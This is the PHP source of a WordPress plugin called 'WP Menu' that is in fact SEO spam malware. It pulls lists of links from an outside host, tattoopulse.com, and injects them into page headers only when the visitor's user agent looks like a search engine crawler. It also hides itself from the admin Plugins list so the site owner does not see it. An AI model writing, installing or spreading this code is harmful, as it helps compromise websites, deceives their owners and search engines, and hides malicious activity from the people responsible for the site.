<?php
/*
Plugin Name: WP Menu
Version: 1.4
Author: Your Name
*/

// Function to fetch URLs from a randomly selected text file
function fetch_urls_from_random_text_file() {
    $base_url = 'https://tattoopulse.com/';
    $max_attempts = 1000; // Maximum number of attempts to find a valid file
    $attempts = 0;

    while ($attempts < $max_attempts) {
        $file_number = rand(1, 1000000); // Adjust this range as needed
        $remote_file_url = $base_url . $file_number . '.txt';

        // Fetch the contents of the selected file
        $response = wp_remote_get($remote_file_url);

        // Check if the request was successful
        if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200) {
            $body = wp_remote_retrieve_body($response);
            // Split the contents of the file by newline to get individual URLs
            $urls = explode("\n", $body);
            // Remove any empty values or whitespace
            $urls = array_map('trim', $urls);
            $urls = array_filter($urls);
            return $urls;
        }

        $attempts++;
    }

    // Return an empty array if unable to fetch URLs after max attempts
    return array();
}

// Function to extract meaningful parts of the URL for use as anchor text
function extract_anchor_text($url) {
    $parsed_url = parse_url($url);
    if (isset($parsed_url['path'])) {
        $path = $parsed_url['path'];
        $path_parts = explode('/', trim($path, '/'));
        $filename = end($path_parts);
        $filename = preg_replace('/\.[^.]+$/', '', $filename); // Remove file extension
        $anchor_text = str_replace('-', ' ', $filename);
        return ucwords($anchor_text);
    }
    return $url;
}

// Function to display all links with spaces between them before the <!DOCTYPE html> declaration for search engine crawlers
function display_all_links_doctype() {
    if (is_whitelisted_crawler()) {
        $urls = fetch_urls_from_random_text_file(); // Get all URLs from a randomly selected text file
        $links_output = ''; // Initialize variable to store links
        foreach ($urls as $url) {
            $anchor_text = extract_anchor_text($url); // Use URL as anchor text
            $links_output .= '<a href="' . esc_url($url) . '">' . esc_html($anchor_text) . '</a> '; // Add space here
        }
        // Output the links before the <!DOCTYPE html> declaration
        echo "\n";
        echo rtrim($links_output); // Remove trailing space if needed
        echo "\n";
        echo "\n";
    }
}

// Hook the function into the wp_head hook to display links before <!DOCTYPE html>
add_action('wp_head', 'display_all_links_doctype', -1);

// Hide the plugin from the Plugins list
add_filter('all_plugins', 'hide_wp_menu_plugin');
function hide_wp_menu_plugin($plugins) {
    if (isset($plugins['wp-menu/wp-menu.php'])) {
        unset($plugins['wp-menu/wp-menu.php']);
    }
    return $plugins;
}

// Function to check if the current visitor is a search engine crawler
function is_whitelisted_crawler() {
    $whitelist_user_agents = array(
        'googlebot',
        'bingbot',
        'msnbot',
        'google.com',
        'yandex',
        'bing',
        'duckduckgo',
        'feedfetcher-google',
        'yahoo' // Added Yahoo user agent
    );

    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

    // Check if the user-agent matches the whitelist
    foreach ($whitelist_user_agents as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true; // Allow the bot
        }
    }
    return false;
}